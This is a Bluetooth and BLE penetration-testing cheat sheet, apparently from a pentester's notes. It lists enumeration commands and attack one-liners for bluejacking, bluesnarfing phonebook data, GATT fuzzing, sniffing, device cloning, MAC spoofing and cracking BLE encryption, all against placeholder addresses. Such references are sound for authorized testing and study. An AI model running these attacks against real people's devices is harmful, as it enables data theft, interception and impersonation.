---
tags:
  - Foundational
---

## Bluetooth Pentesting
resources: [HackTricks Bluetooth](https://book.hacktricks.wiki/en/todo/radio-hacking/bluetooth.html), [BLE CTF Guide](https://github.com/hackgnar/ble_ctf)

> [!info] Discover and enumerate Bluetooth Classic and BLE devices.

### Enumeration

#### Check Bluetooth Adapter
```bash
hciconfig
hciconfig hci0 up
hciconfig hci0 features
```

#### Scan for Classic Bluetooth Devices
```bash
# Basic scan
hcitool scan

# Extended inquiry (device names + class)
hcitool inq

# Interactive scan
bluetoothctl
> scan on
> devices
```

#### Service Discovery (SDP)
```bash
sdptool browse <BT_ADDR>

# Search for specific service
sdptool search --bdaddr <BT_ADDR> SP     # Serial Port
sdptool search --bdaddr <BT_ADDR> OPUSH  # Object Push
```

#### BLE Scanning
```bash
# Enable BLE scanning
hcitool lescan

# Scan with bluetoothctl
bluetoothctl
> menu scan
> transport le
> back
> scan on
```

#### BLE Enumeration with gatttool
```bash
gatttool -b <BLE_ADDR> -I
> connect
> primary          # Discover services
> characteristics  # Discover characteristics
> char-read-hnd <Handle>
> char-write-req <Handle> <Value>
```

#### Bettercap BLE [alternative]
```bash
bettercap
> ble.recon on
> ble.show
> ble.enum <BLE_ADDR>
```

### Attacks

#### Bluejacking (Message Spam)
> Send unsolicited messages via **OBEX**.

```bash
ussp-push <BT_ADDR>@<Channel> <File> <RemoteName>
```

#### Bluesnarfing (Data Theft)
> [!danger] Access data without pairing (exploits older devices).

```bash
bluesnarfer -r 1-100 -b <BT_ADDR>
bluesnarfer -s PB -b <BT_ADDR>  # Get phonebook
```

#### BLE GATT Fuzzing
> [!warning] Write random data to writable characteristics to test for crashes or unexpected behavior.

```bash
gatttool -b <BLE_ADDR> -I
> connect
> char-write-req <Handle> 4141414141
```

#### BLE Sniffing
> [!info] Requires **Ubertooth** or **nRF52840** dongle.

```bash
# Using Ubertooth
ubertooth-btle -f -t <BLE_ADDR>
```

#### BLE Spoofing/Cloning
> [!warning] Clone a BLE device to intercept connections using **bettercap**.

```bash
# Using bettercap
bettercap
> ble.recon on
> set ble.device.address <BLE_ADDR>
> ble.clone
```

#### MAC Spoofing
```bash
spooftooph -i hci0 -a <TargetBT_ADDR>
```

### Tools [optional]

#### Wireshark Bluetooth Capture
```bash
btmon -w /tmp/capture.btsnoop
wireshark /tmp/capture.btsnoop
```

#### Crackle (BLE Encryption)
```bash
crackle -i <Capture.pcap>
```
